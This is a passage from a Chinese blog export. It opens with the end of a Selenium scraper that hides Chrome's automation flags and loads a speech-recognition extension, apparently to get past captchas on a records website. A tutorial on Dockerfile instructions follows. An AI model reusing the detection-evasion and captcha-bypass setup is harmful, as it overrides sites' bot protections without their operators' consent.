class="built_in">print</span>(<span class="string">&#x27;polling result&#x27;</span>, data)</span><br><span class="line">                status = data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;status of task&#x27;</span>, status)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&#x27;Success&#x27;</span>:</span><br><span class="line">                    <span class="keyword">return</span> data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;response&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;polling task failed&#x27;</span>, e)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csv_read</span>():</span></span><br><span class="line">    data = <span class="string">&#x27;./sss.csv&#x27;</span></span><br><span class="line">    csv_data = csv.reader(<span class="built_in">open</span>(data, <span class="string">&#x27;r&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> csv_data:</span><br><span class="line">        <span class="built_in">print</span>(i[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(csv_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(csv_data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 标识 当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    url = <span class="string">&quot;https://www.ispfsb.com/Public/FOID.aspx&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 文件验证是否存在</span></span><br><span class="line">    <span class="comment"># if os.path.exists(&#x27;./&#x27; + id + &#x27;.csv&#x27;):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         os.remove(&#x27;./&#x27; + id + &#x27;.csv&#x27;)</span></span><br><span class="line">    <span class="comment">#     except:</span></span><br><span class="line">    <span class="comment">#         print(&quot;请删除&quot; + id + &#x27;.csv&#x27; + &quot;原文件后重新运行！&quot;)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#     print(id + &#x27;.csv&#x27; + &quot;已删除....&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 浏览器扩展程序</span></span><br><span class="line">    <span class="comment"># 语音识别程序</span></span><br><span class="line">    extension_path1 = <span class="string">&#x27;./1.2.2_0.crx&#x27;</span></span><br><span class="line">    <span class="comment"># xpath程序</span></span><br><span class="line">    extension_path2 = <span class="string">&#x27;./2.0.2_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    options.add_extension(extension_path1)</span><br><span class="line">    options.add_extension(extension_path2)</span><br><span class="line">    driver = webdriver.Chrome(options=options) <span class="comment">#driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line">    driver.maximize_window()</span><br><span class="line">    <span class="comment"># a = input(&quot;人工智障打码操作：&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    get(driver,url)</span><br><span class="line">    <span class="comment"># csv_read()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile指令详解</title>
    <url>//Dockerfile</url>
    <content><![CDATA[<p><code>Dockerfile</code> 是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p>
<h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>命令格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker build [选项] &lt;上下文路径/URL/-&gt;</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构建一个名为 nginx:v3 的镜像</span></span><br><span class="line">$ docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>

<h2 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h2><ol>
<li><code>shell</code>格式：RUN &lt;命令&gt;，就像直接在命令行中输入的命令一样。刚才写的 Dockrfile 中的 RUN 指令就是这种格式。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></li>
<li><code>exec</code>格式：RUN [“可执行文件”, “参数1”, “参数2”]，这更像是函数调用中的格式。</li>
</ol>
<h2 id="COPY-复制文件"><a href="#COPY-复制文件" class="headerlink" title="COPY 复制文件"></a>COPY 复制文件</h2><p>格式：</p>
<ol>
<li><code>COPY &lt;源路径&gt;... &lt;目标路径&gt;</code></li>
<li><code>COPY [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code><br>和 <code>RUN</code> 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用。<br>COPY 指令将从构建上下文目录中 &lt;源路径&gt; 的文件/目录复制到新的一层的镜像内的 &lt;目标路径&gt; 位置。比如：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">COPY package.json /usr/src/app/</span><br></pre></td></tr></table></figure></li>
</ol>
<p><code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 filepath.Match 规则，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">COPY hom* /mydir/</span><br><span class="line">COPY hom?.txt /mydir/</span><br></pre></td></tr></table></figure>
<p><code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 <code>WORKDIR</code> 指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。</p>
<p>此外，还需要注意一点，使用 COPY 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建相关文件都在使用 Git 进行管理的时候。</p>
<h2 id="ADD更高级的复制文件"><a href="#ADD更高级的复制文件" class="headerlink" title="ADD更高级的复制文件"></a>ADD更高级的复制文件</h2><p><code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致。但是在 <code>COPY</code> 基础上增加了一些功能。</p>
<p>比如 <code>&lt;源路径&gt;</code> 可以是一个 URL，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 <code>&lt;目标路径&gt;</code> 去。下载后的文件权限自动设置为 600，如果这并不是想要的权限，那么还需要增加额外的一层 RUN 进行权限调整，另外，如果下载的是个压缩包，需要解压缩，也一样还需要额外的一层 RUN 指令进行解压缩。所以不如直接使用 RUN 指令，然后使用 <code>wget</code> 或者 <code>curl</code> 工具下载，处理权限、解压缩、然后清理无用文件更合理。因此，这个功能其实并不实用，而且不推荐使用。</p>
<p>如果 &lt;源路径&gt; 为一个 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，ADD 指令将会自动解压缩这个压缩文件到 &lt;目标路径&gt; 去。</p>
<p>在 Docker 官方的最佳实践文档中要求，尽可能的使用 COPY 。</p>
<p>因此在 COPY 和 ADD 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</p>
<h2 id="CMD-容器启动命令"><a href="#CMD-容器启动命令" class="headerlink" title="CMD 容器启动命令"></a>CMD 容器启动命令</h2><p>CMD 指令的格式和 RUN 相似，也是两种格式：<br>1） shell 格式：<code>CMD &lt;命令&gt;</code><br>2） exec 格式：<code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code><br>3） 参数列表格式：<code>CMD [&quot;参数1&quot;, &quot;参数2&quot;...]</code>。在指定了 ENTRYPOINT 指令后，用 CMD 指定具体的参数。</p>
<p>Docker 不是虚拟机，容器就是进程。既然是进程，那么在启动容器的时候，需要指定所运行的程序及参数。CMD 指令就是用于指定默认的容器主进程的启动命令的。</p>
<p>在运行时可以指定新的命令来替代镜像设置中的这个默认命令，比如，ubuntu 镜像默认的 CMD 是 /bin/bash，如果我们直接 docker run -it ubuntu 的话，会直接进入 bash。我们也可以在运行时指定运行别的命令，如 docker run -it ubuntu cat /etc/os-release。这就是用 cat /etc/os-release 命令替换了默认的 /bin/bash 命令了，输出了系统版本信息。</p>
<p>在指令格式上，一般推荐使用 exec 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 “，而不要使用单引号。</p>
<h2 id="ENTRYPOINT-入口点"><a href="#ENTRYPOINT-入口点" class="headerlink" title="ENTRYPOINT 入口点"></a>ENTRYPOINT 入口点</h2><p>ENTRYPOINT 的目的和 CMD 一样，都是在指定容器启动程序及参数。ENTRYPOINT 在运行时也可以替代，不过比 CMD 要略显繁琐，需要通过 docker run 的参数 –entrypoint 来指定。</p>
<p>当指定了 ENTRYPOINT 后，CMD 的含义就发生了改变，不再是直接的运行其命令，而是将 CMD 的内容作为参数传给 ENTRYPOINT 指令，换句话说实际执行时，将变为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;ENTRYPOINT&gt; <span class="string">&quot;&lt;CMD&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>场景一：让镜像变成像命令一样使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line">RUN apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y curl \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line">ENTRYPOINT [ <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-s&quot;</span>, <span class="string">&quot;http://ip.cn&quot;</span> ]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run myip -i</span><br></pre></td></tr></table></figure>
<p>这是因为当存在 ENTRYPOINT 后，CMD 的内容将会作为参数传给 ENTRYPOINT，而这里 -i 就是新的 CMD，因此会作为参数传给 curl，从而达到了我们预期的效果。</p>
</li>
<li><p>场景二：应用运行前的准备工作<br>可以写一个脚本，然后放入 ENTRYPOINT 中去执行，而这个脚本会将接到的参数（也就是 <CMD>）作为命令，在脚本最后执行。比如官方镜像 redis 中就是这么做的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM alpine:3.4</span><br><span class="line">...</span><br><span class="line">RUN addgroup -S redis &amp;&amp; adduser -S -G redis redis</span><br><span class="line">...</span><br><span class="line">ENTRYPOINT [<span class="string">&quot;docker-entrypoint.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE 6379</span><br><span class="line">CMD [ <span class="string">&quot;redis-server&quot;</span> ]</span><br></pre></td></tr></table></figure>
<p>可以看到其中为了 redis 服务创建了 redis 用户，并在最后指定了 ENTRYPOINT 为 docker-entrypoint.sh 脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># allow the container to be started with `--user`</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&#x27;redis-server&#x27;</span> -a <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> = <span class="string">&#x27;0&#x27;</span> ]; <span class="keyword">then</span></span><br><span class="line">    chown -R redis .</span><br><span class="line">    <span class="built_in">exec</span> su-exec redis <span class="string">&quot;<span class="variable">$0</span>&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>该脚本的内容就是根据 CMD 的内容来判断，如果是 redis-server 的话，则切换到 redis 用户身份启动服务器，否则依旧使用 root 身份执行。比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -it redis id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="ENV-设置环境变量"><a href="#ENV-设置环境变量" class="headerlink" title="ENV 设置环境变量"></a>ENV 设置环境变量</h2><p>格式有两种：</p>
<ol>
<li><code>ENV &lt;key&gt; &lt;value&gt;</code></li>
<li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li>
</ol>
<p>这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 RUN，还是运行时的应用，都可以直接使用这里定义的环境变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENV VERSION=1.0 DEBUG=on \</span><br><span class="line">    NAME=&quot;Happy Feet&quot;</span><br></pre></td></tr></table></figure>
<p>这个例子中演示了如何换行，以及对含有空格的值用双引号括起来的办法，这和 Shell 下的行为是一致的。</p>
<p>定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。比如在官方 node 镜像 Dockerfile 中，就有类似这样的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENV NODE_VERSION 7.2.0</span><br><span class="line"></span><br><span class="line">RUN curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot; \</span><br><span class="line">  &amp;&amp; curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot; \</span><br><span class="line">  &amp;&amp; gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc \</span><br><span class="line">  &amp;&amp; grep &quot; node-v$NODE_VERSION-linux-x64.tar.xz\$&quot; SHASUMS256.txt | sha256sum -c - \</span><br><span class="line">  &amp;&amp; tar -xJf &quot;node-v$NODE_VERSION-linux-x64.tar.xz&quot; -C /usr/local --strip-components=1 \</span><br><span class="line">  &amp;&amp; rm &quot;node-v$NODE_VERSION-linux-x64.tar.xz&quot; SHASUMS256.txt.asc SHASUMS256.txt \</span><br><span class="line">  &amp;&amp; ln -s /usr/local/bin/node /usr/local/bin/nodejs</span><br></pre></td></tr></table></figure>

<p>在这里先定义了环境变量 NODE_VERSION，其后的 RUN 这层里，多次使用 $NODE_VERSION 来进行操作定制。可以看到，将来升级镜像构建版本的时候，只需要更新 7.2.0 即可，Dockerfile 构建维护变得更轻松了。</p>
<p>下列指令可以支持环境变量展开： ADD、COPY、ENV、EXPOSE、LABEL、USER、WORKDIR、VOLUME、STOPSIGNAL、ONBUILD。</p>
<p>可以从这个指令列表里感觉到，环境变量可以使用的地方很多，很强大。通过环境变量，我们可以让一份 Dockerfile 制作更多的镜像，只需使用不同的环境变量即可。</p>
<h2 id="ARG-构建参数"><a href="#ARG-构建参数" class="headerlink" title="ARG 构建参数"></a>ARG 构建参数</h2><p>格式：<code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></p>
<p>构建参数和 ENV 的效果一样，都是设置环境变量。所不同的是，ARG 所设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 ARG 保存密码之类的信息，因为 docker history 还是可以看到所有值的。</p>
<p>Dockerfile 中的 ARG 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 docker build 中用 –build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p>
<p>在 1.13 之前的版本，要求 –build-arg 中的参数名，必须在 Dockerfile 中用 ARG 定义过了，换句话说，就是 –build-arg 指定的参数，必须在 Dockerfile 中使用了。如果对应参数没有被使用，则会报错退出构建。从 1.13 开始，这种严格的限制被放开，不再报错退出，而是显示警告信息，并继续构建。这对于使用 CI 系统，用同样的构建流程构建不同的 Dockerfile 的时候比较有帮助，避免构建命令必须根据每个 Dockerfile 的内容修改。</p>
<h2 id="VOLUME-定义匿名卷"><a href="#VOLUME-定义匿名卷" class="headerlink" title="VOLUME 定义匿名卷"></a>VOLUME 定义匿名卷</h2><p>格式为：</p>
<ol>
<li><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</code></li>
<li><code>VOLUME &lt;路径&gt;</code></li>
</ol>
<p>之前我们说过，容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中，后面的章节我们会进一步介绍 Docker 卷的概念。为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 Dockerfile 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VOLUME /data</span><br></pre></td></tr></table></figure>

<p>这里的 /data 目录就会在运行时自动挂载为匿名卷，任何向 /data 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -d -v mydata:/data xxxx</span><br></pre></td></tr></table></figure>
<p>在这行命令中，就使用了 mydata 这个命名卷挂载到了 /data 这个位置，替代了 Dockerfile 中定义的匿名卷的挂载配置。</p>
<h2 id="EXPOSE-声明端口"><a href="#EXPOSE-声明端口" class="headerlink" title="EXPOSE 声明端口"></a>EXPOSE 声明端口</h2><p>格式为 <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code>。</p>
<p>EXPOSE 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</p>
<p>此外，在早期 Docker 版本中还有一个特殊的用处。以前所有容器都运行于默认桥接网络中，因此所有容器互相之间都可以直接访问，这样存在一定的安全性问题。于是有了一个 Docker 引擎参数 –icc=false，当指定该参数后，容器间将默认无法互访，除非互相间使用了 –links 参数的容器才可以互通，并且只有镜像中 EXPOSE 所声明的端口才可以被访问。这个 –icc=false 的用法，在引入了 docker network 后已经基本不用了，通过自定义网络可以很轻松的实现容器间的互联与隔离。</p>
<p>要将 EXPOSE 和在运行时使用 -p &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。</p>
<h2 id="WORKDIR-指定工作目录"><a href="#WORKDIR-指定工作目录" class="headerlink" title="WORKDIR 指定工作目录"></a>WORKDIR 指定工作目录</h2><p>格式为 WORKDIR &lt;工作目录路径&gt;。</p>
<p>使用 WORKDIR 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会帮你建立目录。</p>
<p>之前提到一些初学者常犯的错误是把 Dockerfile 等同于 Shell 脚本来书写，这种错误的理解还可能会导致出现下面这样的错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN <span class="built_in">cd</span> /app</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; world.txt</span><br></pre></td></tr></table></figure>

<p>如果将这个 Dockerfile 进行构建镜像运行后，会发现找不到 /app/world.txt 文件，或者其内容不是 hello。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 Dockerfile 中，这两行 RUN 命令的执行环境根本不同，是两个完全不同的容器。这就是对 Dokerfile 构建分层存储的概念不了解所导致的错误。</p>
<p>之前说过每一个 RUN 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 RUN cd /app 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。</p>
<p>因此如果需要改变以后各层的工作目录的位置，那么应该使用 WORKDIR 指令。</p>
<h2 id="USER-指定当前用户"><a href="#USER-指定当前用户" class="headerlink" title="USER 指定当前用户"></a>USER 指定当前用户</h2><p>格式：<code>USER &lt;用户名&gt;</code></p>
<p>USER 指令和 WORKDIR 相似，都是改变环境状态并影响以后的层。WORKDIR 是改变工作目录，USER 则是改变之后层的执行 RUN, CMD 以及 ENTRYPOINT 这类命令的身份。</p>
<p>当然，和 WORKDIR 一样，USER 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br><span class="line">USER redis</span><br><span class="line">RUN [ &quot;redis-server&quot; ]</span><br></pre></td></tr></table></figure>

<p>如果以 root 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 su 或者 sudo，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 gosu，可以从其项目网站看到进一步的信息：<a href="https://github.com/tianon/gosu">https://github.com/tianon/gosu</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 建立 redis 用户，并使用 gosu 换另一个用户执行命令</span><br><span class="line">RUN groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br><span class="line"># 下载 gosu</span><br><span class="line">RUN wget -O /usr/local/bin/gosu &quot;https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64&quot; \</span><br><span class="line">    &amp;&amp; chmod +x /usr/local/bin/gosu \</span><br><span class="line">    &amp;&amp; gosu nobody true</span><br><span class="line"># 设置 CMD，并以另外的用户执行</span><br><span class="line">CMD [ &quot;exec&quot;, &quot;gosu&quot;, &quot;redis&quot;, &quot;redis-server&quot; ]</span><br></pre></td></tr></table></figure>

<h2 id="HEALTHCHECK-健康检查"><a href="#HEALTHCHECK-健康检查" class="headerlink" title="HEALTHCHECK 健康检查"></a>HEALTHCHECK 健康检查</h2><p>格式：</p>
<ol>
<li><code>HEALTHCHECK [选项] CMD &lt;命令&gt;</code>：设置检查容器健康状况的命令</li>
<li><code>HEALTHCHECK NONE</code>：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</li>
</ol>
<p>HEALTHCHECK 指令是告诉 Docker 应该如何进行判断容器的状态是否正常，这是 Docker 1.12 引入的新指令。</p>
<p>在没有 HEALTHCHECK 指令前，Docker 引擎只可以通过容器内主进程是否退出来判断容器是否状态异常。很多情况下这没问题，但是如果程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。</p>
<p>而自 1.12 之后，Docker 提供了 HEALTHCHECK 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。</p>
<p>当在一个镜像指定了 HEALTHCHECK 指令后，用其启动容器，初始状态会为 starting，在 HEALTHCHECK 指令检查成功后变为 healthy，如果连续一定次数失败，则会变为 unhealthy。</p>
<p>HEALTHCHECK 支持下列选项：</p>
<ol>
<li><code>--interval=&lt;间隔&gt;</code>：两次健康检查的间隔，默认为 30 秒；</li>
<li><code>--timeout=&lt;时长&gt;</code>：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；</li>
<li><code>--retries=&lt;次数&gt;</code>：当连续失败指定次数后，则将容器状态视为 unhealthy，默认 3 次。</li>
</ol>
<p>和 CMD, ENTRYPOINT 一样，HEALTHCHECK 只可以出现一次，如果写了多个，只有最后一个生效。</p>
<p>在 HEALTHCHECK [选项] CMD 后面的命令，格式和 ENTRYPOINT 一样，分为 shell 格式，和 exec 格式。命令的返回值决定了该次健康检查的成功与否：0：成功；1：失败；2：保留，不要使用这个值。</p>
<p>假设我们有个镜像是个最简单的 Web 服务，我们希望增加健康检查来判断其 Web 服务是否在正常工作，我们可以用 curl 来帮助判断，其 Dockerfile 的 HEALTHCHECK 可以这么写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y curl &amp;&amp; rm -rf /var/lib/apt/lists/*</span><br><span class="line">HEALTHCHECK --interval=5s --timeout=3s \</span><br><span class="line">  CMD curl -fs http://localhost/ || exit 1</span><br></pre></td></tr></table></figure>

<p>这里我们设置了每 5 秒检查一次（这里为了试验所以间隔非常短，实际应该相对较长），如果健康检查命令超过 3 秒没响应就视为失败，并且使用 curl -fs <a href="http://localhost/">http://localhost/</a> || exit 1 作为健康检查命令。</p>
<p>使用 docker build 来构建这个镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker build -t myweb:v1 .</span><br></pre></td></tr></table></figure>
<p>构建好了后，我们启动一个容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -d --name web -p 80:80 myweb:v1</span><br></pre></td></tr></table></figure>
<p>当运行该镜像后，可以通过 docker ps 看到最初的状态为 (health: starting)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                            PORTS               NAMES</span><br><span class="line">03e28eb00bd0        myweb:v1            <span class="string">&quot;nginx -g &#x27;daemon off&quot;</span>   3 seconds ago       Up 2 seconds (health: starting)   80/tcp, 443/tcp     web</span><br></pre></td></tr></table></figure>
<p>在等待几秒钟后，再次 docker ps，就会看到健康状态变化为了 (healthy)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS               NAMES</span><br><span class="line">03e28eb00bd0        myweb:v1            <span class="string">&quot;nginx -g &#x27;daemon off&quot;</span>   18 seconds ago      Up 16 seconds (healthy)   80/tcp, 443/tcp     web</span><br></pre></td></tr></table></figure>
<p>如果健康检查连续失败超过了重试次数，状态就会变为 (unhealthy)。</p>
<p>为了帮助排障，健康检查命令的输出（包括 stdout 以及 stderr）都会被存储于健康状态里，可以用 docker inspect 来查看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker inspect --format <span class="string">&#x27;&#123;&#123;json .State.Health&#125;&#125;&#x27;</span> web | python -m json.tool</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;FailingStreak&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;Log&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;End&quot;</span>: <span class="string">&quot;2016-11-25T14:35:37.940957051Z&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ExitCode&quot;</span>: 0,</span><br><span class="line">            <span class="string">&quot;Output&quot;</span>: <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;/title&gt;\n&lt;style&gt;\n    body &#123;\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    &#125;\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;/p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href=\&quot;http://nginx.org/\&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;\nCommercial support is available at\n&lt;a href=\&quot;http://nginx.com/\&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Start&quot;</span>: <span class="string">&quot;2016-11-25T14:35:37.780192565Z&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Status&quot;</span>: <span class="string">&quot;healthy&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
